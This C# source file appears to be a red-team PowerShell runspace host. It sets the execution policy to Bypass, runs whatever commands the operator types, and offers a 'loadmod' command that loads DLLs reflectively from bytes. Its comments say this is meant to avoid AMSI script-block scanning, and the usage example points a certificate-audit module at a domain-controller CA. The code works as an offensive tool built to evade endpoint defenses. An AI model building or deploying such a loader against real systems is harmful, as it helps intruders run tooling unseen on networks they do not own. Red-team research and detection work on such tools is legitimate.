using System;
using System.Collections.ObjectModel;
using System.IO;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Reflection;
using System.Text;

public class PS {
    public static void Run() {

        var rs = RunspaceFactory.CreateRunspace();
        rs.Open();

        using (var ps = PowerShell.Create()) {
            ps.Runspace = rs;
            ps.AddScript("Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force");
            try { ps.Invoke(); } catch { }
            ps.Commands.Clear();

            Console.WriteLine("[+] runspace ready (type exit to quit)");

            while (true) {
                try {
                    Console.Write("PS " + rs.SessionStateProxy.Path.CurrentLocation + "> ");
                } catch {
                    Console.Write("PS> ");
                }

                string line = Console.ReadLine();
                if (line == null || line.Equals("exit", StringComparison.OrdinalIgnoreCase)) break;
                if (string.IsNullOrWhiteSpace(line)) continue;

                string trimmed = line.Trim();
                if (trimmed.Equals("clear", StringComparison.OrdinalIgnoreCase) ||
                    trimmed.Equals("cls", StringComparison.OrdinalIgnoreCase)) {
                    Console.Clear();
                    continue;
                }

                // loadmod <dll> <Type> <Method> [arg1 arg2 ...]
                // Loads a DLL and invokes a static method entirely from C# —
                // no PS script text, no AMSI script-block scan.
                // Example: loadmod certaudit.dll CertAudit RunTargeted 10.2.1.22 mcx-DCSRV02-CA WinRMOverSSL
                if (trimmed.StartsWith("loadmod ", StringComparison.OrdinalIgnoreCase)) {
                    string[] parts = trimmed.Split(new char[]{' '}, 4);
                    // parts: [0]=loadmod [1]=dll [2]=Type [3]=Method [rest=args space-sep]
                    if (parts.Length < 4) {
                        Console.WriteLine("[!] Usage: loadmod <dll> <Type> <Method> [args...]");
                        continue;
                    }
                    string dllPath    = parts[1].Trim();
                    string typeName   = parts[2].Trim();
                    string methodName = parts[3].Trim();

                    // Split remaining into method name + args
                    string[] methodParts = methodName.Split(new char[]{' '}, 2);
                    methodName = methodParts[0];
                    string[] args = methodParts.Length > 1
                        ? methodParts[1].Split(new char[]{' '})
                        : new string[0];

                    try {
                        byte[]   raw  = File.ReadAllBytes(dllPath);
                        Assembly asm  = Assembly.Load(raw);
                        Type     t    = asm.GetType(typeName);
                        if (t == null) {
                            Console.WriteLine("[!] Type '" + typeName + "' not found in " + dllPath);
                            continue;
                        }

                        // Build parameter type array matching arg count
                        Type[] paramTypes = new Type[args.Length];
                        for (int i = 0; i < args.Length; i++) paramTypes[i] = typeof(string);

                        MethodInfo m = t.GetMethod(methodName,
                            BindingFlags.Public | BindingFlags.Static, null, paramTypes, null);

                        if (m == null && args.Length == 0)
                            m = t.GetMethod(methodName, BindingFlags.Public | BindingFlags.Static);

                        if (m == null) {
                            Console.WriteLine("[!] Method '" + methodName + "' with " + args.Length + " arg(s) not found.");
                            continue;
                        }

                        object[] invokeArgs = args.Length > 0 ? (object[])args : null;
                        m.Invoke(null, invokeArgs);
                    } catch (Exception ex) {
                        Console.WriteLine("[!] loadmod: " + ex.Message);
                        if (ex.InnerException != null)
                            Console.WriteLine("[!] inner : " + ex.InnerException.Message);
                    }
                    continue;
                }

                ps.Commands.Clear();
                ps.Streams.ClearStreams();
                ps.AddScript(line);
                ps.AddCommand("Out-String");

                try {
                    Collection<PSObject> res = ps.Invoke();
                    foreach (PSObject r in res)
                        if (r != null) Console.Write(r.ToString());
                    if (ps.HadErrors)
                        foreach (var e in ps.Streams.Error)
                            Console.WriteLine("[!] " + e.ToString());
                } catch (Exception ex) {
                    Console.WriteLine("[!] " + ex.Message);
                }
            }
        }

        rs.Close();
    }
}